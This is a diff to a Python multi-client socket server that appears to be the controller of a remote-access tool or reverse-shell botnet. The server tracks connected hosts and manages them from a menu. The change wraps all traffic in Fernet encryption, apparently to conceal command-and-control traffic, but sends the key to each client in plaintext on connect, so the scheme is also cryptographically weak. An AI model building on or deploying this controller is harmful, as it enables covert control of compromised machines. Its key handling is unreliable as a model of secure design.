@@ -1,5 +1,6 @@
 import socket, os, time, threading, sys, json
 from queue import Queue
+from cryptography.fernet import Fernet
 
 arrAddresses = []
 arrConnections = []
@@ -18,10 +19,10 @@ remove_quotes = lambda string: string.replace("\"", "")
 center = lambda string, title: f"{{:^{len(string)}}}".format(title)
 
 # function to send data
-send = lambda data: conn.send(data)
+send = lambda data: conn.send(objEncryptor.encrypt(data))
 
 # function to receive data
-recv = lambda buffer: conn.recv(buffer)
+recv = lambda buffer: objEncryptor.decrypt(conn.recv(buffer))
 
 
 def recvall(buffer):  # function to receive large amounts of data
@@ -29,6 +30,12 @@ def recvall(buffer):  # function to receive large amounts of data
     while len(bytData) < buffer:
         bytData += recv(buffer)
     return bytData
+
+
+def create_encryptor():
+    global objKey, objEncryptor
+    objKey = Fernet.generate_key()
+    objEncryptor = Fernet(objKey)
 
 
 def create_socket():
@@ -57,6 +64,7 @@ def socket_accept():
             conn, address = objSocket.accept()
             conn.setblocking(1)  # no timeout
             address += tuple(json.loads(conn.recv(intBuff).decode()))
+            conn.send(objKey)
             arrConnections.append(conn)
             arrAddresses.append(address)
             print(f"\nConnection has been established: {address[0]} ({address[2]})")
@@ -124,13 +132,13 @@ def main_menu():
 
 
 def close():
-    global arrConnections, arrAddresses
+    global arrConnections, arrAddresses, conn
 
     if len(arrAddresses) == 0:  # if there are no computers connected
         return
 
     for _, conn in enumerate(arrConnections):
-        conn.send(b"exit")
+        send(b"exit")
         conn.close()
     del arrConnections
     arrConnections = []
@@ -139,10 +147,10 @@ def close():
 
 
 def refresh_connections():  # used to remove any lost connections
-    global arrConnections, arrAddresses
+    global arrConnections, arrAddresses, conn
     for intCounter, conn in enumerate(arrConnections):
         try:
-            conn.send(b"test")  # test to see if connection is active
+            send(b"test")  # test to see if connection is active
         except socket.error:
             del arrAddresses[arrConnections.index(conn)]
             arrConnections.remove(conn)
@@ -501,6 +509,7 @@ def work():  # do jobs in the queue
     while True:
         intValue = queue.get()
         if intValue == 1:
+            create_encryptor()
             create_socket()
             socket_bind()
             socket_accept()
